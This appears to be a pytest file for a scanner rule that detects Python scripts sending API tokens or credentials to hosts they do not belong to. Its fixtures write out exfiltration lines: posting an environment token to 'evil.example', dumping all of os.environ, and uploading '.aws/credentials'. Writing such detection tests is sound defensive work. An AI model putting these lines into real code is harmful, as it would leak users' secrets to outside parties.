"""GR110 reads where a script sends a token: the URL it resolves and the variable it comes from."""

from __future__ import annotations

import ast

from ghostrules import prefilter
from ghostrules.rules import scripts as s


def _flow(source: str) -> int | None:
    return s._python_sends_a_secret(source)


def _strings(expression: str, **assigned: str) -> set[str]:
    values = {k: [ast.parse(v, mode="eval").body] for k, v in assigned.items()}
    return s._strings(ast.parse(expression, mode="eval").body, values)


def test_urls_are_followed_through_constants_defaults_and_f_strings() -> None:
    assert _strings("f'{base}/x'", base="'https://a.example'") == {"https://a.example/x"}
    assert _strings("a or b", a="'https://a.example'", b="'https://b.example'") == {
        "https://a.example",
        "https://b.example",
    }
    assert _strings("os.environ.get('B', 'https://d.example')") == {"https://d.example"}
    assert _strings("'https://a.example/' + path") == {"https://a.example/\x00"}


def test_what_is_not_known_stays_unknown() -> None:
    unknown = {"\x00"}
    assert _strings("42") == unknown
    assert _strings("fetch(x)") == unknown
    assert _strings("name") == unknown
    assert _strings("os.environ.get('B')") == unknown
    assert _strings("a", a="a2", a2="a3", a3="a4", a4="a5", a5="a6", a6="a7", a7="'x'") == unknown
    many = {f"x{i}": "'1' or '2' or '3'" for i in range(4)}
    assert _strings(" + ".join(many), **many) == unknown  # more than 64 combinations


def test_a_token_goes_only_to_the_host_it_belongs_to() -> None:
    base = "import os, requests\nT = os.environ['SVC_API_TOKEN']\n"
    assert _flow(base + "requests.post('https://api.svc.example/x', data=T)\n") is None
    assert _flow(base + "requests.post('https://evil.example/x', data=T)\n") == 3
    assert _flow(base + "requests.post(url, data=T)\n") == 3  # a host nobody wrote down
    assert _flow(base + "requests.post(url=f'https://evil.example/{T}', data=T)\n") == 3
    assert _flow(
        "import os, requests\nrequests.post('https://svc.example', json=dict(os.environ))\n"
    )
    assert _flow("def broken(:\n") is None


def test_a_credentials_file_has_no_service() -> None:
    source = (
        "import requests\nrequests.post('https://svc.example/x', data=open('.aws/credentials'))\n"
    )
    assert _flow(source) == 2


def test_service_names() -> None:
    assert s._service_of("APIFY_API_TOKEN") == "APIFY"
    assert s._service_of("RUBE_TOKEN") == "RUBE"
    assert s._service_of("_TOKEN") == ""
    assert s._service_of("PATH") == ""


def test_a_pattern_the_reader_cannot_parse_is_not_filtered(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    import re

    def boom(*_a: object) -> None:
        raise ValueError

    pattern = re.compile("unreadable-pattern")
    monkeypatch.setattr(prefilter._p, "parse", boom)
    assert prefilter.keys(pattern) is None
    prefilter.keys.cache_clear()
